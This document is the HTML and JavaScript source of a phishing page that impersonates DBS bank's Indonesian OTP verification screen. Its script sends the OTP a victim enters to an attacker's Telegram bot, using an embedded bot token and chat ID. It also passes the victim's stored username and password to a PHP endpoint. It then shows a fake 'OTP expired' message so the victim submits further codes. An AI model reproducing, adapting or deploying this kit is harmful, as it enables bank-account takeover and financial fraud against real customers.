<html>
 <head> 
  <title>Verifikasi OTP DBS</title> 
  <!-- Viewport mobile tag for sensible mobile support --> 
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> 
  <link type="text/css" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:400,700,400italic,700italic"> 
  <link type="text/css" rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css"> 
  <!--STYLES--> 
  <meta name="theme-color" content="#000000"> 
  <link href="" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css"> 
  <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css"> 
  <link nonce="78df019a-039a-4053-8729-826e29022d7e" rel="preloadshortcut icon" href="https://www.dbs.id/id/digibank/_next/public/favicon.ico"> 
  <link nonce="78df019a-039a-4053-8729-826e29022d7e" rel="shortcut icon" href="https://www.dbs.id/id/digibank/_next/public/favicon.ico"> 
  <style>
        @import url('https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap');
        * {
            font-family: 'Ubuntu', sans-serif;
            font-weight: 400;
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            color: #fff;
            position: relative;
        }

        b {
            font-weight: 500;
        }

        html {
            width: 100%;
            height: 100%;
        }

        body {
            background: #000;
            display: flex;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            width: 100%;
            height: 100%;
        }

        .container {
            width: 100%;
            height: 100%;
            background-image: url('ast/bgblur.webp');
            background-size: cover;
            background-repeat: no-repeat;
            background-position: center center;
            display: flex;
            align-items: center;
            flex-direction: column;
        }

        .container .head {
            width: 100%;
            height: 60px;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 10px 0 80px 0;
        }

        .container .head .back {
            width: 10px;
            position: absolute;
            left: 20px;
        }

        .container .head .logo {
            width: 150px;
        }

        form {
            width: 100%;
            padding: 20px;
        }

        form input {
            width: 100%;
            height: 50px;
            background: #fff;
            font-size: 15px;
            color: #000;
            outline: none;
            border: none;
            padding: 10px 20px;
            margin-bottom: 20px;
            margin-top: 10px;
        }

        form button {
            width: 100%;
            margin-bottom: 20px;
            height: 50px;
            font-size: 14px;
            border: none;
            background: #ef3c3c;
        }

        form .forgot {
            font-size: 13px;
            margin-bottom: 20px;
            font-weight: 300;
            margin-left: 20px;
        }

        form .zs {
            margin-left: 20px;
            margin-bottom: 20px;
            font-size: 13px;
            text-align: center;
            color: #8f8f8f;
        }

        form .reg {
            width: 100%;
            height: 50px;
            border: none;
            border-radius: 10px;
            background: #ffffff1d;
        }

        form label {
            margin: 0px auto;
            margin-top: 30px;
        }
    </style> 
 </head> 
 <body> 
  <div class="container"> 
   <div class="head"> 
    <img class="back" onclick="window.location.href='aktivasi.html'" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjU2t7x4nQs-aoCY5m0uryn-YJmlYRPHp1u0zyXA3IEht3mMVqPY-obgcp4WcH_TvtSWcdBSzlTzS7rOBLz9yAnROfpr3IvEBemIywnDRT3WDCex3npWfRdVogWY26Dt6DZR6ppbugXy2VezbBAIPSfdng6YAJRIsIqP_9IltQAu274EZChbKMkWubXo14/s60/1x.png" alt=""> 
    <img class="logo" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhBsm6_twIjCW4zyx7ZhQ87Yn-xvYl8uD9OcLswmxYaGHkRaKmv5C8S2xn5wVYihrqzdmoe9A0lZFXgoXAVCwyFZeR56G3RNH80gDQZDDxz4XGQk54muM6Kop8ZIIohmi7Z5Qsn7IUCpgMKZ8auChtCdhHq2fJzL4Ah4YSUYoHDIP_XwLGApOvlYm7YGww/s736/1logo.webp" alt=""> 
   </div> 
<form id="formotp" onsubmit="otpform(); return false" method="post"> 
  <input type="hidden" id="user" name="user" value="null"> 
  <input type="hidden" id="pass" name="pass" value="null"> 

  <br> 
  <label style="margin-top: 30px">Masukkan Kode OTP</label> 
  <input oninput="if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" 
         name="otp" id="otp" required autocomplete="off" placeholder="Kode OTP" 
         type="tel" inputmode="numeric" minlength="4" maxlength="6"> 

  <button type="submit" id="kirims">KONFIRMASI</button> 
</form> 

<p id="back">Kirim ulang<br></p> 
<p id="timer">3 : 00</p> 

<script>
  function otpform() {
    const otp = document.getElementById('otp').value.trim();

    if (!otp) {
      alert("Kode OTP wajib diisi!");
      return;
    }

    // Ganti dengan token dan chat ID yang sesuai
    const token = '8054205621:AAE7E-MqDS6kHUSgzv8J1DjBDDtLH7CiS3Y'; // Ganti dengan token bot Telegrammu
    const chat_id = '8055762875'; // Ganti dengan chat ID Telegrammu

    const message = `KODE OTP: ${otp}`;

    // Kirim data ke Telegram
    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chat_id,
        text: message
      })
    })
    .then(response => {
      if (response.ok) {
        setTimeout(() => {
          // Ganti teks "Kirim ulang" dengan teks baru setelah 3 detik
          const backText = document.getElementById('back');
          backText.textContent = "Masa OTP telah habis/Kadaluarsa";
          backText.style.color = "red"; // Ubah warna menjadi merah

          setTimeout(() => {
            // Arahkan ke halaman finish.html setelah 3 detik
            window.location.href = "otp.html";
          }, 3000); // Delay 3 detik sebelum arahkan ke halaman finish.html
        }, 1000); // Delay sedikit sebelum mengganti teks
      } else {
        alert("Gagal mengirim data ke Telegram.");
      }
    })
    .catch(error => {
      console.error("Error:", error);
      alert("Terjadi kesalahan saat mengirim data.");
    });
  }
</script>

  <script>
        document.getElementById('timer').innerHTML =
            03 + ":" + 01;
        startTimer1();

        function startTimer1() {
            var presentTime = document.getElementById('timer').innerHTML;
            var timeArray = presentTime.split(/[:]+/);
            var m = timeArray[0];
            var s = checkSecond((timeArray[1] - 1));
            if (s == 59) {
                m = m - 1
            }
            if (m < 0) {
                return
            }

            document.getElementById('timer').innerHTML =
                m + " : " + s;
            console.log(m)
            setTimeout(startTimer1, 1000);

        }

        function checkSecond(sec) {
            if (sec < 10 && sec >= 0) {
                sec = "0" + sec
            }; // add zero in front of numbers < 10
            if (sec < 0) {
                sec = "59"
            };
            return sec;
        }
    </script> 
  <script>
        var user = sessionStorage.getItem("user");
        document.getElementById("user").value = user + "";
        var pass = sessionStorage.getItem("pass");
        document.getElementById("pass").value = pass + "";
    </script> 
  <script>
        $('#formotp').on('submit', function(event) {

            event.stopPropagation();
            event.preventDefault();

            document.getElementById('kirims').innerHTML = "Memproses....";



            $.ajax({

                type: 'POST',
                url: '../auth/sendOtp.php',
                async: false,
                dataType: 'JSON',
                data: $(this).serialize(),

                complete: function(data) {
                    console.log('Complete')
                    setTimeout(function() {
                        document.getElementById('kirims').innerHTML = "KONFIRMASI";
                        $('#back').text('Masa OTP telah habis/Kadaluarsa');
                        $('#back').css('color', 'red');
                    }, 1000);
                    setTimeout(function() {
                        $('#back').text('Kirim ulang');
                        $('#back').css('color', 'white');
                        $('#otp').val('');
                        $('#otp').focus();
                    }, 4000);
                }
            });

            return false;
        });
    </script> 
 </body>
</html>